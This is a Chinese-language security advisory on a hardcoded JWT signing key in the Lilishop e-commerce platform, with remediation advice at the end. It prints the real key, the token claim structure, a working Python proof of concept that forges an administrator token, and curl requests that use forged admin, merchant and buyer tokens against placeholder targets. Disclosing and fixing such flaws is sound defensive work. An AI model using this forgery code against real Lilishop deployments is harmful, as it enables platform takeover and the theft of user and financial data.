# V-L001: Lilishop 硬编码 JWT 签名密钥导致任意用户身份伪造

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | Lilishop 多商户电商系统 |
| 版本 | 当前主分支（截至 2026-04）|
| 类型 | CWE-321: 使用硬编码加密密钥 / CWE-287: 身份验证不当 |
| 严重程度 | 严重（Critical）|
| 攻击向量 | 网络（完全未授权）|
| 代码仓库 | https://github.com/beijing-penguin/lilishop |

## 漏洞描述

Lilishop 使用 JWT 作为会话凭证，其 HMAC-SHA 签名密钥在 `SecretKeyUtil.java` 中被**硬编码**为常量：

```java
public class SecretKeyUtil {
    public static SecretKey generalKey() {
        byte[] encodedKey = Base64.decodeBase64(
            "cuAihCz53DZRjZwbsGcZJ2Ai6At+T142uphtJMsk7iQ=");
        return Keys.hmacShaKeyFor(encodedKey);
    }
    public static SecretKey generalKeyByDecoders() {
        return Keys.hmacShaKeyFor(
            Decoders.BASE64.decode("cuAihCz53DZRjZwbsGcZJ2Ai6At+T142uphtJMsk7iQ="));
    }
}
```

由于该密钥随开源代码公开，任何人都可以使用同样的密钥**伪造任意用户、店铺或管理端 Token**，从而完全绕过身份认证体系。

### 关联调用

- **签发**：`TokenUtil.java:126-134` — `Jwts.builder().setSubject(...).signWith(SecretKeyUtil.generalKey())`
- **校验**：`TokenUtil.java:69` — `.setSigningKey(SecretKeyUtil.generalKeyByDecoders())`

签发与校验使用同一硬编码密钥，且 subject / claims 结构完全公开（含 `role=MEMBER/STORE/MANAGER`、`id`、`username` 等）。

## 漏洞详情

### Payload 结构（基于 `AbstractTokenGenerate.java`）

```json
{
  "sub": "admin",
  "role": "MANAGER",
  "id": "1",
  "iat": 1744600000,
  "exp": 9999999999
}
```

`role` 枚举：
- `MEMBER` — 买家会员
- `STORE` — 商家店铺端
- `MANAGER` — 后台运营管理员

### 利用路径

1. 使用公开密钥生成 `role=MANAGER` 的 JWT
2. 附加到请求头 `accessToken`
3. 访问任意 `/manager/**` 管理端接口 → 接管整个平台

## 概念验证

### Python PoC — 伪造管理员 Token

```python
import jwt, base64, time

key = base64.b64decode("cuAihCz53DZRjZwbsGcZJ2Ai6At+T142uphtJMsk7iQ=")

payload = {
    "sub": "admin",
    "role": "MANAGER",
    "id": "1",
    "iat": int(time.time()),
    "exp": int(time.time()) + 86400
}

token = jwt.encode(payload, key, algorithm="HS256")
print("Forged Token:", token)
```

### 验证

```bash
# 使用伪造的 MANAGER Token 访问后台接口
curl -H "accessToken: <forged_token>" \
  http://<target>/manager/user/manager/getUserPage

# 伪造 STORE 商家 Token 查看其他店铺订单
curl -H "accessToken: <store_token>" \
  http://<target>/store/order/order/getByPage

# 伪造任意买家 Token（userId=XXX）访问其订单
curl -H "accessToken: <buyer_token>" \
  http://<target>/buyer/order/order/getByPage
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `framework/.../security/token/SecretKeyUtil.java` | 19, 25 | 硬编码 Base64 密钥 |
| `framework/.../security/token/TokenUtil.java` | 69, 134 | 签发 / 校验均使用该密钥 |
| `framework/.../security/token/base/AbstractTokenGenerate.java` | - | 定义 claim 结构，含 role 字段 |

## 影响

1. **完全身份伪造**：可生成任意 MEMBER / STORE / MANAGER Token
2. **平台接管**：冒充 MANAGER 后可修改商品、订单、财务、分销关系
3. **横向越权**：冒充任意 STORE 可查看/篡改其他商家业务数据
4. **数据泄露**：遍历 userId 枚举可导出所有会员个人信息
5. **资金风险**：篡改财务结算、退款审核等关键业务

## 修复建议

1. **立即轮换密钥**：启动时从环境变量 / KMS / Vault 加载，禁止代码仓库保存
   ```java
   byte[] encodedKey = System.getenv("JWT_SECRET").getBytes();
   ```
2. **强制密钥长度与随机性**：至少 256 位随机密钥，部署时每实例或每租户独立
3. **使用非对称算法**：改用 RS256/ES256，公钥可分发，私钥仅签发侧持有
4. **增加 `kid`(密钥 ID) + 密钥轮换机制**
5. **审计 Git 历史**：即使替换密钥，历史记录仍保留原始值，需要确保所有旧 Token 已过期

## 验证环境

- 源代码：Lilishop 主分支（静态代码分析）
- 框架：Spring Boot + JJWT + Redis
- 日期：2026-04-14
